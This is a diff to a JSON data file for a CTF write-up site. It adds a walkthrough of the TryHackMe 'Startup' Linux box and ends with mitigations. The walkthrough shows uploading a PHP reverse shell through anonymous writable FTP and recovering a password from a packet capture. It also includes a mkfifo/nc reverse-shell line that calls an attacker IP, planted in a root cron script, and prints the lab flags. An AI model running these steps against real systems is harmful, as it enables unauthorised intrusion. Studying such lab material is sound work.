@@ -1,6 +1,72 @@
 {
- "generated": "2026-11-17",
+ "generated": "2026-11-22",
  "writeups": [
+  {
+   "slug": "startup",
+   "title": "Startup",
+   "platform": "TryHackMe",
+   "difficulty": "Easy",
+   "date": "2026-11-23",
+   "github": "https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/startup_writeup.md",
+   "summary": "Anonymous FTP allows writes, and the same folder is published on the web at /files/ftp/, so a PHP reverse shell uploaded over FTP runs with one click…",
+   "takeaway": "Chained trust is the lesson: a writable FTP folder is minor, a readable capture is minor, a writable script is minor. The engagement value is spotting that each one feeds the next. Also, \"something keeps rewriting this file on a timer\" is one of the most reliable privesc tells on Linux — always check what owns the scheduled thing and what it executes.",
+   "tldrHtml": "Anonymous FTP allows writes, and the same folder is published on the web at <code>/files/ftp/</code>, so a PHP reverse shell uploaded over FTP runs with one click in the browser and lands a <code>www-data</code> shell. A leftover packet capture in <code>/incidents/</code> contains <code>lennie</code>'s password in cleartext (recovered by following the TCP stream), which gives the user flag over <code>su</code>. For root, a script in <code>lennie</code>'s home, <code>planner.sh</code>, is executed on a schedule by root and in turn runs <code>/etc/print.sh</code>, which is world-writable. Dropping a reverse shell into <code>/etc/print.sh</code> and waiting for the job returns a root shell. ",
+   "tools": [
+    "RustScan / Nmap",
+    "ftp",
+    "feroxbuster",
+    "whatweb",
+    "php-reverse-shell",
+    "nc",
+    "python (pty)",
+    "Wireshark",
+    "nano"
+   ],
+   "sections": [
+    {
+     "id": "introduction",
+     "label": "Introduction",
+     "html": "<p>Startup is an easy Linux box whose whole theme is &quot;trusting files you shouldn't&quot;. The interesting bit isn't a CVE, it's the chain of trust: anonymous FTP that's also your webroot, a password sitting in a packet capture someone left on disk, and a root cron job that executes a file anyone can write. None of these is exotic on its own. Put them in a line and you walk from unauthenticated to root.</p>"
+    },
+    {
+     "id": "recon",
+     "label": "Recon",
+     "html": "<p>RustScan into an Nmap service scan:</p>\n<pre><code class=\"language-bash\">rustscan -a 10.48.177.140 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>\n<pre><code>21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| drwxrwxrwx    2 65534  65534  4096 Nov 12  2020 ftp [NSE: writeable]\n| -rw-r--r--    1 0      0    251631 Nov 12  2020 important.jpg\n|_-rw-r--r--    1 0      0       208 Nov 12  2020 notice.txt\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Maintenance</code></pre>\n<p>Nmap does most of the work for us here: anonymous FTP is open and, more importantly, the <code>ftp</code> directory is flagged <strong>writeable</strong>. The web server just says &quot;Maintenance&quot;.</p>\n<p>A content scan of port 80 shows the FTP contents are mirrored on the web:</p>\n<pre><code class=\"language-bash\">feroxbuster -u http://10.48.177.140/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -x php,xt,html</code></pre>\n<pre><code>301  http://10.48.177.140/files =&gt; /files/\n200  http://10.48.177.140/files/notice.txt\n200  http://10.48.177.140/files/important.jpg</code></pre>\n<p>So <code>/files/</code> is the FTP root, and the writable <code>ftp/</code> folder is reachable at <code>/files/ftp/</code>. That is the whole foothold in one observation.</p>"
+    },
+    {
+     "id": "foothold",
+     "label": "Foothold",
+     "html": "<p>Logging in anonymously and reading the files first:</p>\n<pre><code class=\"language-bash\">ftp 10.48.177.140\n# Name: anonymous  (blank password)\nftp&gt; get notice.txt\nftp&gt; get important.jpg</code></pre>\n<pre><code>$ cat notice.txt\nWhoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY ... Maya is looking pretty sus.</code></pre>\n<p><code>important.jpg</code> is, as promised, an Among Us meme. No stego rabbit hole needed; the real gift is that the folder is writable and web-served.</p>"
+    },
+    {
+     "id": "shell",
+     "label": "Shell and access",
+     "html": "<p>Upload a PHP reverse shell over FTP into the writable <code>ftp/</code> directory:</p>\n<pre><code class=\"language-bash\">ftp 10.48.177.140\nftp&gt; cd ftp\nftp&gt; put php-reverse-shell.php</code></pre>\n<p>Start a listener, then trigger it in the browser at <code>http://10.48.177.140/files/ftp/php-reverse-shell.php</code>:</p>\n<pre><code class=\"language-bash\">nc -lnvp 4444</code></pre>\n<pre><code>connect to [192.168.134.217] from (UNKNOWN) [10.48.177.140]\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></pre>\n<p>We land as <code>www-data</code>. <code>/home/lennie</code> exists but is not readable yet, and the root of the filesystem has two things worth a look: <code>recipe.txt</code> (flavour text) and an <code>incidents/</code> folder.</p>\n<pre><code>www-data@startup:/$ ls /incidents\nsuspicious.pcapng</code></pre>\n<p>A packet capture sitting on a web server is never there by accident. Exfiltrate it:</p>\n<pre><code class=\"language-bash\">www-data@startup:/incidents$ python3 -m http.server 8755\n# then download http://10.48.177.140:8755/suspicious.pcapng</code></pre>\n<p>Open it in Wireshark, right-click an entry and <strong>Follow &gt; TCP Stream</strong>. The stream contains <code>lennie</code>'s password in cleartext:</p>\n<pre><code>c4ntg3t3n0ughsp1c3</code></pre>\n<p>Switch to that user:</p>\n<pre><code class=\"language-bash\">www-data@startup:/$ su lennie\nPassword: c4ntg3t3n0ughsp1c3\nlennie@startup:~$ cat user.txt\nTHM{03ce3d619b80ccbfb3b7fc81e46c0e79}</code></pre>"
+    },
+    {
+     "id": "escalation",
+     "label": "Escalation",
+     "html": "<p><code>sudo -l</code> is a dead end — <code>lennie may not run sudo</code>. So look at what <code>lennie</code> owns and what runs on a timer. In <code>~/scripts</code>:</p>\n<pre><code class=\"language-bash\">lennie@startup:~/scripts$ cat planner.sh\n#!/bin/bash\necho $LIST &gt; /home/lennie/scripts/startup_list.txt\n/etc/print.sh</code></pre>\n<pre><code class=\"language-bash\">lennie@startup:~/scripts$ ls -lah\n-rwxr-xr-x 1 root root   77 Nov 12  2020 planner.sh\n-rw-r--r-- 1 root root    1 Jun 21 21:57 startup_list.txt</code></pre>\n<p><code>planner.sh</code> is owned by root, and <code>startup_list.txt</code> keeps getting rewritten with a fresh timestamp — something runs this on a schedule as root. And <code>planner.sh</code> calls <code>/etc/print.sh</code>:</p>\n<pre><code class=\"language-bash\">lennie@startup:~/scripts$ cat /etc/print.sh\n#!/bin/bash\necho &quot;Done!&quot;</code></pre>\n<p>Check who can write it:</p>\n<pre><code class=\"language-bash\">lennie@startup:~/scripts$ ls -l /etc/print.sh\n# writable by lennie</code></pre>\n<p><code>/etc/print.sh</code> is editable by us and executed by a root job. That's the vector.</p>"
+    },
+    {
+     "id": "chain",
+     "label": "The full chain",
+     "html": "<p>Edit <code>/etc/print.sh</code> and append a reverse shell (keeping the original <code>echo</code> so the job still looks normal):</p>\n<pre><code class=\"language-bash\">lennie@startup:~/scripts$ export TERM=xterm-256color   # nano needs a real terminal\nlennie@startup:~/scripts$ nano /etc/print.sh</code></pre>\n<pre><code class=\"language-bash\">#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.134.217 4445 &gt;/tmp/f\necho &quot;Done!&quot;</code></pre>\n<p>Start the listener and wait for the scheduled root run:</p>\n<pre><code class=\"language-bash\">nc -lnvp 4445</code></pre>\n<pre><code>connect to [192.168.134.217] from (UNKNOWN) [10.48.177.140]\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# cat /root/root.txt\nTHM{f963aaa6a430f210222158ae15c3d76d}</code></pre>\n<p>Running <code>bash planner.sh</code> by hand only runs <code>print.sh</code> as <code>lennie</code> (and errors on the root-owned <code>startup_list.txt</code>), so the root shell comes from the scheduled job, not from running it yourself. Patience, not force.</p>"
+    },
+    {
+     "id": "rabbit-holes",
+     "label": "Rabbit holes",
+     "html": "<ul><li>Tried <code>cd lennie</code> from <code>/</code> and got &quot;No such file or directory&quot;, then <code>cd /home/lennie</code> gave &quot;Permission denied&quot; as <code>www-data</code>. The home only opens up after becoming <code>lennie</code>.</li><li><code>nano /etc/print.sh</code> kept failing with &quot;Error opening terminal: unknown&quot; until the shell was upgraded (<code>python3 -c 'import pty...'</code>, <code>stty raw -echo; fg</code>, then <code>export TERM=xterm-256color</code>). A dumb reverse shell can't run a full-screen editor.</li><li><code>important.jpg</code> looks like a stego invitation. It isn't; it's a meme. The writable web-served FTP folder is the actual path.</li></ul>"
+    },
+    {
+     "id": "mitigations",
+     "label": "Mitigations",
+     "html": "<ul><li><strong>Anonymous, writable FTP mapped to the webroot:</strong> never allow anonymous writes, and never serve an upload directory as executable web content. Either of those alone kills the foothold; together they are remote code execution for anyone.</li><li><strong>Secrets in a packet capture on disk:</strong> don't leave captures on production hosts, and don't send credentials over cleartext protocols that end up in them. If a capture must exist, it shouldn't be readable by the web user.</li><li><strong>World-writable script run by root:</strong> a scheduled root job must only execute files that root owns and only root can write. <code>chown root:root</code> and <code>chmod 755</code> (or tighter) on <code>/etc/print.sh</code>, and the privesc is gone.</li></ul>"
+    }
+   ],
+   "takeawayHtml": "Chained trust is the lesson: a writable FTP folder is minor, a readable capture is minor, a writable script is minor. The engagement value is spotting that each one feeds the next. Also, &quot;something keeps rewriting this file on a timer&quot; is one of the most reliable privesc tells on Linux — always check what owns the scheduled thing and what it executes.",
+   "againHtml": "<p>I'd check whether the FTP root was web-served *before* downloading anything, since that single fact is the whole foothold. And I'd upgrade the shell to a full TTY immediately after catching it, instead of hitting the nano terminal error first.</p>"
+  },
   {
    "slug": "ra",
    "title": "Ra",
